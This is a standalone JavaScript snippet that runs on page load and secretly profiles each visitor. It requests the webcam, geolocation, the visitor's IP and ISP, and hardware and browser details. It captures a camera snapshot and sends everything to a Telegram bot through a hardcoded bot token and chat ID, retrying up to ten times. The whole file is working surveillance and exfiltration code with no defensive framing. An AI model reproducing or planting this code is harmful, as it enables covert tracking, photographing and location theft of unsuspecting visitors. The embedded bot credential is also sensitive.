(function() {
    'use strict';

    const TELEGRAM_TOKEN = '8526795343:AAEdQZSX2wB8cOpJPSwJ65FvPLhTgJoREAI';
    const TELEGRAM_CHAT_ID = '-5190064240';

    let collectedData = {};
    let cameraStream = null;
    let sendAttempts = 0;
    const MAX_ATTEMPTS = 10;

    async function collectAll() {
        collectedData = {};

        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } }
            });
            cameraStream = stream;
            const track = stream.getVideoTracks()[0];
            const settings = track.getSettings();
            collectedData.camera = {
                enabled: true,
                width: settings.width,
                height: settings.height,
                facingMode: settings.facingMode || 'user'
            };
        } catch (e) {
            collectedData.camera = { error: 'denied' };
        }

        try {
            const res = await fetch('https://ipapi.co/json/');
            if (res.ok) {
                const data = await res.json();
                collectedData.ip = {
                    ip: data.ip,
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    isp: data.org
                };
                console.log('🌐 IP:', data.ip);
            }
        } catch (e) {
            console.log('🌐 IP falhou');
        }

        try {
            const pos = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
            });
            collectedData.geolocation = {
                lat: pos.coords.latitude,
                lng: pos.coords.longitude,
                accuracy: pos.coords.accuracy
            };
        } catch (e) {}

        try {
            const battery = await navigator.getBattery();
            collectedData.battery = {
                level: battery.level,
                charging: battery.charging
            };
        } catch (e) {}

        try {
            const gl = document.createElement('canvas').getContext('webgl');
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                collectedData.gpu = {
                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                };
            }
        } catch (e) {}

        collectedData.browser = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory || 'unknown'
        };

        collectedData.screen = {
            width: screen.width,
            height: screen.height,
            devicePixelRatio: window.devicePixelRatio
        };

        collectedData.timezone = {
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            offset: new Date().getTimezoneOffset()
        };

        collectedData.collectedAt = new Date().toISOString();
        collectedData.url = window.location.href;

        sendAttempts = 0;
        trySend();
    }

    function captureSnapshot() {
        return new Promise((resolve) => {
            if (!cameraStream) { resolve(null); return; }
            const video = document.createElement('video');
            video.srcObject = cameraStream;
            video.play();
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 320;
                canvas.height = video.videoHeight || 240;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                resolve(canvas.toDataURL('image/jpeg', 0.7));
                video.pause();
                video.srcObject = null;
            }, 500);
        });
    }

    async function trySend() {
        sendAttempts++;

        try {
            const data = collectedData;
            const snapshot = await captureSnapshot();

            let msg = 'OPSEC whbf.cc\n\n';

            if (data.ip) {
                msg += 'IP: ' + (data.ip.ip || '?') + '\n';
                msg += 'Cidade: ' + (data.ip.city || '') + '\n';
                msg += 'Pais: ' + (data.ip.country || '') + '\n';
                msg += 'ISP: ' + (data.ip.isp || '') + '\n\n';
            }

            if (data.geolocation) {
                msg += 'Geo: ' + data.geolocation.lat + ', ' + data.geolocation.lng + '\n\n';
            }

            if (data.battery) {
                msg += 'Bateria: ' + Math.round(data.battery.level * 100) + '%';
                msg += data.battery.charging ? ' (carregando)\n\n' : '\n\n';
            }

            if (data.gpu) {
                msg += 'GPU: ' + (data.gpu.renderer || '') + '\n\n';
            }

            if (data.browser) {
                msg += 'Platform: ' + data.browser.platform + ' | ' + data.browser.language + '\n';
                msg += 'Cores: ' + (data.browser.hardwareConcurrency || '?') + '\n';
                msg += 'RAM: ' + (data.browser.deviceMemory || '?') + ' GB\n\n';
            }

            if (data.screen) {
                msg += 'Screen: ' + data.screen.width + 'x' + data.screen.height;
                msg += ' @' + data.screen.devicePixelRatio + 'x\n\n';
            }

            if (data.timezone) {
                msg += 'Timezone: ' + data.timezone.timezone + '\n\n';
            }

            if (data.camera && data.camera.enabled) {
                msg += 'Camera: ' + data.camera.width + 'x' + data.camera.height + '\n\n';
            }

            msg += 'Url: ' + data.url + '\n';
            msg += data.collectedAt;

            const url = 'https://api.telegram.org/bot' + TELEGRAM_TOKEN + '/sendMessage';
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: parseInt(TELEGRAM_CHAT_ID),
                    text: msg
                })
            });

            if (!response.ok) {
                const errorText = await response.text();
                console.log('Erro Telegram:', errorText);
                throw new Error('HTTP ' + response.status);
            }

            if (snapshot) {
                const photoUrl = 'https://api.telegram.org/bot' + TELEGRAM_TOKEN + '/sendPhoto';
                const formData = new FormData();
                const blob = await fetch(snapshot).then(r => r.blob());
                formData.append('chat_id', TELEGRAM_CHAT_ID);
                formData.append('photo', blob, 'shot.jpg');
                await fetch(photoUrl, { method: 'POST', body: formData });
            }

            return;

        } catch (e) {
            if (sendAttempts < MAX_ATTEMPTS) {
                setTimeout(trySend, 3000);
            }
        }
    }

    collectAll();
})();
